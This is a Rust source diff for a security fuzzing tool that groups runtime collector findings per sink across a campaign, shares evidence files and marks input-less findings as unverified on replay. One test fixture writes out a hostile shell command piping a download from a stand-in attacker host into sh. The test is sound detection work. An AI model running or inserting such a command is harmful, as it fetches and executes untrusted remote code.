@@ -328,6 +328,17 @@ pub struct LaunchedReplay {
     pub delivery: Option<std::thread::JoinHandle<std::io::Result<()>>>,
 }
 
+/// What makes two collector hits one finding.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+enum Dedupe {
+    /// The oracle signature: rule, API and the subject (the path, command or
+    /// address), for a replay of one testcase.
+    BySignature,
+    /// Rule, oracle and API, for a whole campaign, where every input's subject
+    /// differs.
+    BySite,
+}
+
 /// One collector-sourced semantic finding ready to be written.
 #[derive(Debug, Clone)]
 pub struct CollectorFinding {
@@ -534,6 +545,21 @@ impl ResolvedCollector {
     pub fn evaluate_jsonl(&self, jsonl: &str, root: &str) -> CollectorOutcome {
         let set = CollectorSessionSet::from_jsonl(jsonl);
         self.evaluate(&set, root)
+    }
+
+    /// [`Self::evaluate_jsonl`] for a whole campaign's events (the Linux
+    /// runtrace view of `bhf fuzz`): one finding per rule, oracle and API, as
+    /// the oracle lane keeps them, since each input's subject (the command a
+    /// fuzzed `system()` ran) differs; and none for a rule in `skip_rules`, the
+    /// ones the oracle lane already wrote with their own testcases.
+    pub fn evaluate_aggregate_jsonl(
+        &self,
+        jsonl: &str,
+        root: &str,
+        skip_rules: &BTreeSet<String>,
+    ) -> CollectorOutcome {
+        let set = CollectorSessionSet::from_jsonl(jsonl);
+        self.evaluate_with(&set, root, Dedupe::BySite, skip_rules)
     }
 
     /// Spawn the sidecar, LAUNCH the retained target under it once it is ready,
@@ -749,6 +775,16 @@ impl ResolvedCollector {
     /// Pure evaluation step (no I/O): attribute each session and run the oracle
     /// registry over its events. Deduplicated by oracle signature.
     pub fn evaluate(&self, set: &CollectorSessionSet, root: &str) -> CollectorOutcome {
+        self.evaluate_with(set, root, Dedupe::BySignature, &BTreeSet::new())
+    }
+
+    fn evaluate_with(
+        &self,
+        set: &CollectorSessionSet,
+        root: &str,
+        dedupe: Dedupe,
+        skip_rules: &BTreeSet<String>,
+    ) -> CollectorOutcome {
         let mut findings = Vec::new();
         let mut seen: BTreeSet<String> = BTreeSet::new();
         let mut run_fidelity = runtime_collector::schema::Fidelity::default();
@@ -782,8 +818,17 @@ impl ResolvedCollector {
                     let Some(hit) = oracle.evaluate(&oracle_ev) else {
                         continue;
                     };
+                    if skip_rules.contains(&hit.rule_id) {
+                        continue;
+                    }
                     let signature = crate::runtime_oracles::oracle_signature(&hit);
-                    if !seen.insert(signature.clone()) {
+                    let key = match dedupe {
+                        Dedupe::BySignature => signature.clone(),
+                        Dedupe::BySite => {
+                            format!("{}|{}|{}", hit.rule_id, hit.oracle_name, hit.api)
+                        }
+                    };
+                    if !seen.insert(key) {
                         continue;
                     }
                     findings.push(CollectorFinding {
@@ -908,14 +953,19 @@ fn observed_classes(session: &CollectorSession) -> Vec<String> {
 /// Build the `collector` provenance block embedded in a finding. `observation`
 /// records the (limited) scope the collector actually watched, so a reviewer never
 /// reads a single-testcase replay as whole-campaign coverage (#76).
-fn collector_block(finding: &CollectorFinding, observation: ObservationMode) -> Value {
+fn collector_block(
+    finding: &CollectorFinding,
+    observation: ObservationMode,
+    evidence: &str,
+) -> Value {
     json!({
         "provenance": finding.provenance,
         "root": finding.root,
-        "evidence": EVIDENCE_FILE,
+        "evidence": evidence,
         "attributing_event": finding.attributing_event,
         "process_tree": finding.process_tree,
-        "clean_assurance": finding.provenance.clean_assurance_ok(),
+        "clean_assurance": observation != ObservationMode::Aggregate
+            && finding.provenance.clean_assurance_ok(),
         "observation": observation.label(),
         "coverage": observation.coverage(),
     })
@@ -923,6 +973,17 @@ fn collector_block(finding: &CollectorFinding, observation: ObservationMode) -> 
 
 /// Name of the stored collector-session evidence file next to a finding.
 pub const EVIDENCE_FILE: &str = "collector_session.jsonl";
+
+/// Where finding `finding` (in `finding_dir`) keeps its session evidence:
+/// `paths.collector_evidence`, relative to the finding, else
+/// [`EVIDENCE_FILE`] beside it.
+fn evidence_path(finding_dir: &Path, finding: &Value) -> PathBuf {
+    let relative = finding
+        .pointer("/paths/collector_evidence")
+        .and_then(Value::as_str)
+        .unwrap_or(EVIDENCE_FILE);
+    finding_dir.join(relative)
+}
 
 /// Allocate the next collector finding id (`COL-NNNN`) in `findings_dir`. A
 /// dedicated prefix keeps collector findings from colliding with a lane's own id
@@ -961,11 +1022,35 @@ pub fn write_finding(
     input: &[u8],
     observation: ObservationMode,
 ) -> anyhow::Result<()> {
+    write_finding_with_evidence(dir, id, target, finding, input, observation, None)
+}
+
+/// [`write_finding`], with the session evidence in `shared_evidence` (a path
+/// relative to `dir`) instead of a copy beside the finding: a campaign's
+/// aggregate session is written once for all its findings.
+pub fn write_finding_with_evidence(
+    dir: &Path,
+    id: &str,
+    target: Value,
+    finding: &CollectorFinding,
+    input: &[u8],
+    observation: ObservationMode,
+    shared_evidence: Option<&str>,
+) -> anyhow::Result<()> {
     std::fs::create_dir_all(dir).with_context(|| format!("create {}", dir.display()))?;
     std::fs::write(dir.join("testcase.bin"), input)
         .with_context(|| format!("write {}", dir.join("testcase.bin").display()))?;
-    std::fs::write(dir.join(EVIDENCE_FILE), finding.session_jsonl.as_bytes())
-        .with_context(|| format!("write {}", dir.join(EVIDENCE_FILE).display()))?;
+    let evidence_file = match shared_evidence {
+        Some(path) => path.to_owned(),
+        None => {
+            std::fs::write(dir.join(EVIDENCE_FILE), finding.session_jsonl.as_bytes())
+                .with_context(|| format!("write {}", dir.join(EVIDENCE_FILE).display()))?;
+            EVIDENCE_FILE.to_owned()
+        }
+    };
+    // An aggregate observation saw the whole campaign at once, not this
+    // finding's input: it is no high-confidence or clean assurance.
+    let aggregate = observation == ObservationMode::Aggregate;
 
     let evidence: serde_json::Map<String, Value> = finding
         .hit
@@ -981,7 +1066,7 @@ pub fn write_finding(
         "classification": "oracle_hit",
         "confirmation": "collector",
         "severity": "high",
-        "confidence": "high",
+        "confidence": if aggregate { "medium" } else { "high" },
         "message": finding.hit.message,
         "target": target,
         "input": {
@@ -996,10 +1081,10 @@ pub fn write_finding(
             "evidence": evidence,
             "signature": finding.signature
         },
-        "collector": collector_block(finding, observation),
+        "collector": collector_block(finding, observation, &evidence_file),
         "paths": {
             "testcase": "testcase.bin",
-            "collector_evidence": EVIDENCE_FILE
+            "collector_evidence": evidence_file
         },
         "triage": {
             "replay": format!("bhf replay {id}")
@@ -1071,10 +1156,18 @@ pub(crate) fn replay_collector_outcome(
 ) -> Result<crate::replay::LaneReplay, String> {
     let (matched, want, details) =
         replay_collector_finding_inner(finding_dir).map_err(|error| format!("{error:#}"))?;
+    // A finding of the campaign-aggregate view has no input: its evidence
+    // re-evaluates, but no input of it was replayed.
+    let unverified = matched && finding_has_no_input(finding_dir);
     Ok(crate::replay::LaneReplay {
         lane: "collector",
         matched,
-        status_line: if matched {
+        unverified,
+        status_line: if unverified {
+            "UNVERIFIED collector finding has no input to replay; its stored evidence still \
+             produces the signature"
+                .to_owned()
+        } else if matched {
             "MATCH".to_owned()
         } else {
             "MISMATCH collector semantic signature not reproduced from evidence".to_owned()
@@ -1091,6 +1184,16 @@ pub(crate) fn replay_collector_outcome(
         history: "replay",
         ..Default::default()
     })
+}
+
+/// Whether collector finding `finding_dir` was recorded with no input (the
+/// campaign-aggregate view, which observed no one testcase).
+fn finding_has_no_input(finding_dir: &Path) -> bool {
+    let recorded = read_finding_json(finding_dir)
+        .ok()
+        .and_then(|raw| raw.pointer("/input/bytes").and_then(Value::as_u64));
+    let testcase = std::fs::metadata(finding_dir.join("testcase.bin")).map(|meta| meta.len());
+    recorded == Some(0) || matches!(testcase, Ok(0) | Err(_))
 }
 
 /// `bhf replay` of a collector finding with the default output.
@@ -1115,7 +1218,7 @@ fn replay_collector_finding_inner(
         .and_then(Value::as_str)
         .ok_or_else(|| anyhow!("collector finding is missing oracle.signature"))?
         .to_owned();
-    let evidence_path = finding_dir.join(EVIDENCE_FILE);
+    let evidence_path = evidence_path(finding_dir, &finding);
     let evidence = std::fs::read_to_string(&evidence_path)
         .with_context(|| format!("read collector evidence {}", evidence_path.display()))?;
     let root = finding_root(&finding);
@@ -1157,7 +1260,7 @@ pub fn minimize_collector_finding(finding_dir: &Path) -> anyhow::Result<Collecto
         .and_then(Value::as_str)
         .ok_or_else(|| anyhow!("collector finding is missing oracle.signature"))?
         .to_owned();
-    let evidence = std::fs::read_to_string(finding_dir.join(EVIDENCE_FILE))
+    let evidence = std::fs::read_to_string(evidence_path(finding_dir, &finding))
         .with_context(|| "read collector evidence")?;
     let root = finding_root(&finding);
     let window_ms = finding_window_ms(&finding);
@@ -1259,6 +1362,122 @@ mod tests {
             rules.contains("BHF-435"),
             "controlled-library-load finding: {rules:?}"
         );
+    }
+
+    /// A campaign's fuzzed `system()` runs a different command for each input:
+    /// the aggregate view gives one finding for the sink, not one per command,
+    /// and none for a rule the oracle lane already wrote.
+    #[test]
+    fn an_aggregate_campaign_gives_one_finding_per_sink() {
+        let mut mock = MockCollector::new(1000, "/srv/sandbox/target");
+        for i in 0..4u32 {
+            mock = mock.with_effect(runtime_collector::mock::MockEffect {
+                kind: runtime_collector::schema::EventKind::ShellExecute,
+                pid: 1001 + i,
+                parent: Some(1000),
+                ancestor: Some(1000),
+                image: Some("/bin/sh".into()),
+                path: None,
+                args: vec![
+                    "-c".into(),
+                    format!("curl http://attacker.example/{i} | sh"),
+                ],
+                verb: Some("exec".into()),
+                address: None,
+                input_derived: true,
+                taint_offset: Some(0),
+                ts_offset: 1.0 + f64::from(i),
+            });
+        }
+        let collector = mock_resolved(250);
+        let set = sessions(&mock, "campaign-aggregate", 0);
+        let commands = |outcome: &CollectorOutcome| {
+            outcome
+                .findings
+                .iter()
+                .filter(|f| f.hit.rule_id == "BHF-431")
+                .count()
+        };
+        assert!(commands(&collector.evaluate(&set, "/srv/sandbox")) > 1);
+        let aggregate =
+            collector.evaluate_with(&set, "/srv/sandbox", Dedupe::BySite, &BTreeSet::new());
+        assert_eq!(commands(&aggregate), 1);
+        let oracle_lane = BTreeSet::from(["BHF-431".to_owned()]);
+        let skipped = collector.evaluate_with(&set, "/srv/sandbox", Dedupe::BySite, &oracle_lane);
+        assert_eq!(commands(&skipped), 0);
+    }
+
+    /// An aggregate finding is no high-confidence or clean assurance, and its
+    /// session evidence is the campaign's shared file, which replay reads.
+    #[test]
+    fn an_aggregate_finding_is_medium_confidence_with_shared_evidence() {
+        let collector = mock_resolved(250);
+        let set = sessions(&MockCollector::process_exec(), "campaign-aggregate", 0);
+        let outcome =
+            collector.evaluate_with(&set, "/srv/sandbox", Dedupe::BySite, &BTreeSet::new());
+        let finding = &outcome.findings[0];
+        let tmp = tempfile::tempdir().unwrap();
+        let findings = tmp.path().join("results/findings");
+        let shared = tmp.path().join("results/collector/aggregate.jsonl");
+        std::fs::create_dir_all(shared.parent().unwrap()).unwrap();
+        std::fs::write(&shared, finding.session_jsonl.as_bytes()).unwrap();
+        let dir = findings.join("COL-0001");
+        write_finding_with_evidence(
+            &dir,
+            "COL-0001",
+            json!({"kind": "harness"}),
+            finding,
+            &[],
+            ObservationMode::Aggregate,
+            Some("../../collector/aggregate.jsonl"),
+        )
+        .unwrap();
+        let raw = read_finding_json(&dir).unwrap();
+        assert_eq!(raw["confidence"], "medium");
+        assert_eq!(raw["collector"]["clean_assurance"], false);
+        assert!(
+            !dir.join(EVIDENCE_FILE).exists(),
+            "the session is written once"
+        );
+        assert_eq!(
+            evidence_path(&dir, &raw),
+            dir.join("../../collector/aggregate.jsonl")
+        );
+        let (matched, _, _) = replay_collector_finding_inner(&dir).unwrap();
+        assert!(matched, "replay reads the shared evidence");
+    }
+
+    /// A finding with no input (the campaign-aggregate view's) replays as
+    /// UNVERIFIED, exit 4: its evidence re-evaluates, but no input of it ran.
+    /// One with an input still replays as MATCH.
+    #[test]
+    fn a_finding_without_an_input_replays_as_unverified() {
+        let collector = mock_resolved(250);
+        let set = sessions(&MockCollector::process_exec(), "tc", 0);
+        let finding = &collector.evaluate(&set, "/srv/sandbox").findings[0];
+        let tmp = tempfile::tempdir().unwrap();
+        let without = tmp.path().join("COL-0001");
+        write_finding(
+            &without,
+            "COL-0001",
+            json!({"kind": "harness"}),
+            finding,
+            &[],
+            ObservationMode::Aggregate,
+        )
+        .unwrap();
+        assert_eq!(replay_collector_finding(&without), 4);
+        let with = tmp.path().join("COL-0002");
+        write_finding(
+            &with,
+            "COL-0002",
+            json!({"kind": "binary"}),
+            finding,
+            b"payload",
+            ObservationMode::Replay,
+        )
+        .unwrap();
+        assert_eq!(replay_collector_finding(&with), 0);
     }
 
     #[test]
